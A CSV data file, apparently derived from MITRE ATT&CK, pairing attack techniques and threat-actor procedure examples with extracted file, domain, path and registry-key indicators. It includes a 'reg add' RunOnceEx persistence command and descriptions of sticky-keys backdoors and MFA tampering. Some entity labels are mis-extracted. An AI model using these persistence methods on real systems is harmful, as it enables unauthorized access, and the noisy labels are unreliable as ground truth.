T1218.010,Regsvr32,RogueRobin  uses regsvr32.exe to run a .sct file for execution.   [33],Procedure Examples,file,regsvr32.exe
T1218.010,Regsvr32,Squirrelwaffle  has been executed using  regsvr32.exe .   [36],Procedure Examples,file,regsvr32.exe
T1218.010,Regsvr32,TA551  has used regsvr32.exe to load malicious DLLs.   [37],Procedure Examples,file,regsvr32.exe
T1218.010,Regsvr32,Valak  has used  regsvr32.exe  to launch malicious DLLs.   [38]      [37],Procedure Examples,file,regsvr32.exe
T1218.010,Regsvr32,WIRTE  has used  regsvr32.exe  to trigger the execution of a malicious script.   [39],Procedure Examples,file,regsvr32.exe
T1102.002,Bidirectional Communication,Revenge RAT  used blogpost.com as its primary command and control server during a campaign.   [40],Procedure Examples,domain,blogpost.com
T1102.002,Bidirectional Communication,Sandworm Team  has used the Telegram Bot API from Telegram Messenger to send and receive commands to its Python backdoor.  Sandworm Team  also used legitimate M.E.Doc software update check requests for sending and receiving commands and hosted malicious payloads on putdrive.com.   [45]      [46],Procedure Examples,domain,putdrive.com
T1574.002,DLL Side-Loading,"DLL side-loading has been used to execute  BBSRAT  through a legitimate Citrix executable, ssonsvr.exe. The Citrix executable was dropped along with  BBSRAT  by the dropper.   [11]",Procedure Examples,file,ssonsvr.exe
T1574.002,DLL Side-Loading,"Clambling  can store a file named  mpsvc.dll , which opens a malicious  mpsvc.mui  file, in the same folder as the legitimate Microsoft executable  MsMpEng.exe  to gain execution.   [16]      [17]",Procedure Examples,file,mpsvc.dll
T1574.002,DLL Side-Loading,"Clambling  can store a file named  mpsvc.dll , which opens a malicious  mpsvc.mui  file, in the same folder as the legitimate Microsoft executable  MsMpEng.exe  to gain execution.   [16]      [17]",Procedure Examples,file,MsMpEng.exe
T1574.002,DLL Side-Loading,Earth Lusca  has placed a malicious payload in  %WINDIR%\SYSTEM32\oci.dll  so it would be sideloaded by the MSDTC service.   [18],Procedure Examples,file,oci.dll
T1574.002,DLL Side-Loading,Ecipekac  can abuse the legitimate application policytool.exe to load a malicious DLL.   [19],Procedure Examples,file,policytool.exe
T1574.002,DLL Side-Loading,"Lazarus Group  has replaced  win_fw.dll , an internal component that is executed during IDA Pro installation, with a malicious DLL to download and execute a payload.   [31]",Procedure Examples,file,win_fw.dll
T1574.002,DLL Side-Loading,LookBack  side loads its communications module as a DLL into the  libcurl.dll  loader.   [32],Procedure Examples,file,libcurl.dll
T1574.002,DLL Side-Loading,PowGoop  can side-load  Goopdate.dll  into  GoogleUpdate.exe .   [39]      [50],Procedure Examples,file,Goopdate.dll
T1574.002,DLL Side-Loading,PowGoop  can side-load  Goopdate.dll  into  GoogleUpdate.exe .   [39]      [50],Procedure Examples,file,GoogleUpdate.exe
T1574.002,DLL Side-Loading,SideCopy  has used a malicious loader DLL file to execute the  credwiz.exe  process and side-load the malicious payload  Duser.dll .   [53],Procedure Examples,file,credwiz.exe
T1574.002,DLL Side-Loading,SideCopy  has used a malicious loader DLL file to execute the  credwiz.exe  process and side-load the malicious payload  Duser.dll .   [53],Procedure Examples,file,Duser.dll
T1574.002,DLL Side-Loading,Sidewinder  has used DLL side-loading to drop and execute malicious payloads including the hijacking of the legitimate Windows application file rekeywiz.exe.   [54],Procedure Examples,file,rekeywiz.exe
T1574.002,DLL Side-Loading,"During the  T9000  installation process, it drops a copy of the legitimate Microsoft binary igfxtray.exe. The executable contains a side-loading weakness which is used to load a portion of the malware.   [55]",Procedure Examples,file,igfxtray.exe
T1574.002,DLL Side-Loading,"Wingbird  side loads a malicious file, sspisrv.dll, in part of a spoofed lssas.exe service.   [60]      [61]",Procedure Examples,file,sspisrv.dll
T1574.002,DLL Side-Loading,"Wingbird  side loads a malicious file, sspisrv.dll, in part of a spoofed lssas.exe service.   [60]      [61]",Procedure Examples,file,lssas.exe
T1547.009,Shortcut Modification,Gazer  can establish persistence by creating a .lnk file in the Start menu or by modifying existing .lnk files to execute the malware through cmd.exe.   [12]      [13],Procedure Examples,file,cmd.exe
T1547.009,Shortcut Modification,"S-Type  may create the file  %HOMEPATH%\Start Menu\Programs\Startup\Realtek {Unique Identifier}.lnk , which points to the malicious  msdtc.exe  file already created in the  %CommonFiles%  directory.   [32]",Procedure Examples,file,msdtc.exe
T1546.004,Unix Shell Configuration Modification,"Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User  Unix Shell s execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system ( /etc ) and the user’s home directory ( ~/ ) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately.    Adversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the  /etc/profile  and  /etc/profile.d  files.   [1]      [2]    These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into  ~/.bash_profile ,  ~/.bash_login , or  ~/.profile  which are sourced when a user opens a command-line interface or connects remotely.   [3]      [4]    Since the system only executes the first existing file in the listed order, adversaries have used  ~/.bash_profile  to ensure execution. Adversaries have also leveraged the  ~/.bashrc  file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface.   [5]      [3]      [6]      [7]    Some malware targets the termination of a program to trigger execution, adversaries can use the  ~/.bash_logout  file to execute malicious commands at the end of a session.    For macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using  /etc/profile ,  /etc/zshenv ,  /etc/zprofile , and  /etc/zlogin .   [8]      [9]      [10]      [11]    The login shell then configures the user environment with  ~/.zprofile  and  ~/.zlogin . The interactive shell uses the  ~/.zshrc  to configure the user environment. Upon exiting,  /etc/zlogout  and  ~/.zlogout  are executed. For legacy programs, macOS executes  /etc/bashrc  on startup.",Description,domain,terminal.app
T1546.004,Unix Shell Configuration Modification,"Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User  Unix Shell s execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system ( /etc ) and the user’s home directory ( ~/ ) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately.    Adversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the  /etc/profile  and  /etc/profile.d  files.   [1]      [2]    These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into  ~/.bash_profile ,  ~/.bash_login , or  ~/.profile  which are sourced when a user opens a command-line interface or connects remotely.   [3]      [4]    Since the system only executes the first existing file in the listed order, adversaries have used  ~/.bash_profile  to ensure execution. Adversaries have also leveraged the  ~/.bashrc  file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface.   [5]      [3]      [6]      [7]    Some malware targets the termination of a program to trigger execution, adversaries can use the  ~/.bash_logout  file to execute malicious commands at the end of a session.    For macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using  /etc/profile ,  /etc/zshenv ,  /etc/zprofile , and  /etc/zlogin .   [8]      [9]      [10]      [11]    The login shell then configures the user environment with  ~/.zprofile  and  ~/.zlogin . The interactive shell uses the  ~/.zshrc  to configure the user environment. Upon exiting,  /etc/zlogout  and  ~/.zlogout  are executed. For legacy programs, macOS executes  /etc/bashrc  on startup.",Description,path,~/.zshrc
T1546.004,Unix Shell Configuration Modification,"Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User  Unix Shell s execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system ( /etc ) and the user’s home directory ( ~/ ) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately.    Adversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the  /etc/profile  and  /etc/profile.d  files.   [1]      [2]    These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into  ~/.bash_profile ,  ~/.bash_login , or  ~/.profile  which are sourced when a user opens a command-line interface or connects remotely.   [3]      [4]    Since the system only executes the first existing file in the listed order, adversaries have used  ~/.bash_profile  to ensure execution. Adversaries have also leveraged the  ~/.bashrc  file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface.   [5]      [3]      [6]      [7]    Some malware targets the termination of a program to trigger execution, adversaries can use the  ~/.bash_logout  file to execute malicious commands at the end of a session.    For macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using  /etc/profile ,  /etc/zshenv ,  /etc/zprofile , and  /etc/zlogin .   [8]      [9]      [10]      [11]    The login shell then configures the user environment with  ~/.zprofile  and  ~/.zlogin . The interactive shell uses the  ~/.zshrc  to configure the user environment. Upon exiting,  /etc/zlogout  and  ~/.zlogout  are executed. For legacy programs, macOS executes  /etc/bashrc  on startup.",Description,path,~/.bash
T1546.004,Unix Shell Configuration Modification,"Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User  Unix Shell s execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system ( /etc ) and the user’s home directory ( ~/ ) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately.    Adversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the  /etc/profile  and  /etc/profile.d  files.   [1]      [2]    These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into  ~/.bash_profile ,  ~/.bash_login , or  ~/.profile  which are sourced when a user opens a command-line interface or connects remotely.   [3]      [4]    Since the system only executes the first existing file in the listed order, adversaries have used  ~/.bash_profile  to ensure execution. Adversaries have also leveraged the  ~/.bashrc  file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface.   [5]      [3]      [6]      [7]    Some malware targets the termination of a program to trigger execution, adversaries can use the  ~/.bash_logout  file to execute malicious commands at the end of a session.    For macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using  /etc/profile ,  /etc/zshenv ,  /etc/zprofile , and  /etc/zlogin .   [8]      [9]      [10]      [11]    The login shell then configures the user environment with  ~/.zprofile  and  ~/.zlogin . The interactive shell uses the  ~/.zshrc  to configure the user environment. Upon exiting,  /etc/zlogout  and  ~/.zlogout  are executed. For legacy programs, macOS executes  /etc/bashrc  on startup.",Description,path,/etc/profile  and  /etc/profile.d
T1003.008, or etc or passwd and  or etc or shadow,LaZagne  can obtain credential information from /etc/shadow using the shadow.py module.   [3],Procedure Examples,domain,shadow.py
T1003.008, or etc or passwd and  or etc or shadow,LaZagne  can obtain credential information from /etc/shadow using the shadow.py module.   [3],Procedure Examples,path,/etc/shadow using the shadow.py
T1568.002,Domain Generation Algorithms,"Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.   [1]      [2]      [3]      DGAs can take the form of apparently random or ""gibberish"" strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.   [1]      [2]      [4]      [5]      Adversaries may use DGAs for the purpose of  Fallback Channels . When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.   [4]      [6]      [7]",Description,domain,istgmxdejdnxuyla.ru
T1568.002,Domain Generation Algorithms,"Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.   [1]      [2]      [3]      DGAs can take the form of apparently random or ""gibberish"" strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.   [1]      [2]      [4]      [5]      Adversaries may use DGAs for the purpose of  Fallback Channels . When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.   [4]      [6]      [7]",Description,domain,cityjulydish.net
T1546.008,Accessibility Features,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.   Two common accessibility programs are  C:\Windows\System32\sethc.exe , launched when the shift key is pressed five times and  C:\Windows\System32\utilman.exe , launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as ""sticky keys"", and has been used by adversaries for unauthenticated access through a remote desktop login screen.    [1]      Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in  %systemdir%\ , and it must be protected by Windows File or Resource Protection (WFP/WRP).    [2]    The  Image File Execution Options Injection  debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.   For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g.,  C:\Windows\System32\utilman.exe ) may be replaced with ""cmd.exe"" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over  Remote Desktop Protocol  will cause the replaced file to be executed with SYSTEM privileges.    [3]      Other accessibility features exist that may also be leveraged in a similar fashion:    [2]      [4]",Description,path,C:\Windows\System32\sethc.exe
T1546.008,Accessibility Features,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.   Two common accessibility programs are  C:\Windows\System32\sethc.exe , launched when the shift key is pressed five times and  C:\Windows\System32\utilman.exe , launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as ""sticky keys"", and has been used by adversaries for unauthenticated access through a remote desktop login screen.    [1]      Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in  %systemdir%\ , and it must be protected by Windows File or Resource Protection (WFP/WRP).    [2]    The  Image File Execution Options Injection  debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.   For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g.,  C:\Windows\System32\utilman.exe ) may be replaced with ""cmd.exe"" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over  Remote Desktop Protocol  will cause the replaced file to be executed with SYSTEM privileges.    [3]      Other accessibility features exist that may also be leveraged in a similar fashion:    [2]      [4]",Description,path,C:\Windows\System32\utilman.exe
T1546.008,Accessibility Features,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.   Two common accessibility programs are  C:\Windows\System32\sethc.exe , launched when the shift key is pressed five times and  C:\Windows\System32\utilman.exe , launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as ""sticky keys"", and has been used by adversaries for unauthenticated access through a remote desktop login screen.    [1]      Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in  %systemdir%\ , and it must be protected by Windows File or Resource Protection (WFP/WRP).    [2]    The  Image File Execution Options Injection  debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.   For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g.,  C:\Windows\System32\utilman.exe ) may be replaced with ""cmd.exe"" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over  Remote Desktop Protocol  will cause the replaced file to be executed with SYSTEM privileges.    [3]      Other accessibility features exist that may also be leveraged in a similar fashion:    [2]      [4]",Description,file,sethc.exe
T1546.008,Accessibility Features,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.   Two common accessibility programs are  C:\Windows\System32\sethc.exe , launched when the shift key is pressed five times and  C:\Windows\System32\utilman.exe , launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as ""sticky keys"", and has been used by adversaries for unauthenticated access through a remote desktop login screen.    [1]      Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in  %systemdir%\ , and it must be protected by Windows File or Resource Protection (WFP/WRP).    [2]    The  Image File Execution Options Injection  debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.   For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g.,  C:\Windows\System32\utilman.exe ) may be replaced with ""cmd.exe"" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over  Remote Desktop Protocol  will cause the replaced file to be executed with SYSTEM privileges.    [3]      Other accessibility features exist that may also be leveraged in a similar fashion:    [2]      [4]",Description,file,utilman.exe
T1546.008,Accessibility Features,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.   Two common accessibility programs are  C:\Windows\System32\sethc.exe , launched when the shift key is pressed five times and  C:\Windows\System32\utilman.exe , launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as ""sticky keys"", and has been used by adversaries for unauthenticated access through a remote desktop login screen.    [1]      Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in  %systemdir%\ , and it must be protected by Windows File or Resource Protection (WFP/WRP).    [2]    The  Image File Execution Options Injection  debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.   For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g.,  C:\Windows\System32\utilman.exe ) may be replaced with ""cmd.exe"" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over  Remote Desktop Protocol  will cause the replaced file to be executed with SYSTEM privileges.    [3]      Other accessibility features exist that may also be leveraged in a similar fashion:    [2]      [4]",Description,file,cmd.exe
T1546.008,Accessibility Features,APT3  replaces the Sticky Keys binary  C:\Windows\System32\sethc.exe  for persistence.   [7],Procedure Examples,path,C:\Windows\System32\sethc.exe
T1546.008,Accessibility Features,APT3  replaces the Sticky Keys binary  C:\Windows\System32\sethc.exe  for persistence.   [7],Procedure Examples,file,sethc.exe
T1546.008,Accessibility Features,"Empire  can leverage WMI debugging to remotely replace binaries like sethc.exe, Utilman.exe, and Magnify.exe with cmd.exe.   [11]",Procedure Examples,file,sethc.exe
T1546.008,Accessibility Features,"Empire  can leverage WMI debugging to remotely replace binaries like sethc.exe, Utilman.exe, and Magnify.exe with cmd.exe.   [11]",Procedure Examples,file,Utilman.exe
T1546.008,Accessibility Features,"Empire  can leverage WMI debugging to remotely replace binaries like sethc.exe, Utilman.exe, and Magnify.exe with cmd.exe.   [11]",Procedure Examples,file,Magnify.exe
T1546.008,Accessibility Features,"Empire  can leverage WMI debugging to remotely replace binaries like sethc.exe, Utilman.exe, and Magnify.exe with cmd.exe.   [11]",Procedure Examples,file,cmd.exe
T1556.006,Multi-Factor Authentication,"Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.   Once adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such as  Multi-Factor Authentication Request Generation , adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality.   [1]      [2]      For example, modifying the Windows hosts file ( C:\windows\system32\drivers\etc\hosts ) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a ""fail open"" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA.    [3]       Depending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment.   [3]",Description,path,C:\windows\system32\drivers\etc\hosts
T1547.001,Registry Run Keys  or  Startup Folder,"Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the ""run keys"" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.   [1]    These programs will be executed under the context of the user and will have the account's associated permissions level.   Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is  C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup . The startup folder path for all users is  C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp .   The following run keys are created by default on Windows systems:   Run keys may exist under multiple hives.   [2]      [3]    The  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx  is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.   [1]    For example, it is possible to load a DLL at logon using a ""Depend"" key with RunOnceEx:  reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\temp\evil[.]dll""     [4]      The following Registry keys can be used to set startup folder items for persistence:   The following Registry keys can control automatic startup of services during boot:   Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:   The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit  and  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell  subkeys can automatically launch programs.   Programs listed in the load value of the registry key  HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows  run when any user logs on.   By default, the multistring  BootExecute  value of the registry key  HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager  is set to  autocheck autochk * . This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.   Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use  Masquerading  to make the Registry entries look as if they are associated with legitimate programs.",Description,registry-key,HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
T1547.001,Registry Run Keys  or  Startup Folder,"Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the ""run keys"" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.   [1]    These programs will be executed under the context of the user and will have the account's associated permissions level.   Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is  C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup . The startup folder path for all users is  C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp .   The following run keys are created by default on Windows systems:   Run keys may exist under multiple hives.   [2]      [3]    The  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx  is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.   [1]    For example, it is possible to load a DLL at logon using a ""Depend"" key with RunOnceEx:  reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\temp\evil[.]dll""     [4]      The following Registry keys can be used to set startup folder items for persistence:   The following Registry keys can control automatic startup of services during boot:   Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:   The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit  and  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell  subkeys can automatically launch programs.   Programs listed in the load value of the registry key  HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows  run when any user logs on.   By default, the multistring  BootExecute  value of the registry key  HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager  is set to  autocheck autochk * . This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.   Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use  Masquerading  to make the Registry entries look as if they are associated with legitimate programs.",Description,registry-key,HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
T1547.001,Registry Run Keys  or  Startup Folder,"Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the ""run keys"" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.   [1]    These programs will be executed under the context of the user and will have the account's associated permissions level.   Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is  C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup . The startup folder path for all users is  C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp .   The following run keys are created by default on Windows systems:   Run keys may exist under multiple hives.   [2]      [3]    The  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx  is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.   [1]    For example, it is possible to load a DLL at logon using a ""Depend"" key with RunOnceEx:  reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\temp\evil[.]dll""     [4]      The following Registry keys can be used to set startup folder items for persistence:   The following Registry keys can control automatic startup of services during boot:   Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:   The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit  and  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell  subkeys can automatically launch programs.   Programs listed in the load value of the registry key  HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows  run when any user logs on.   By default, the multistring  BootExecute  value of the registry key  HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager  is set to  autocheck autochk * . This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.   Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use  Masquerading  to make the Registry entries look as if they are associated with legitimate programs.",Description,registry-key,HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
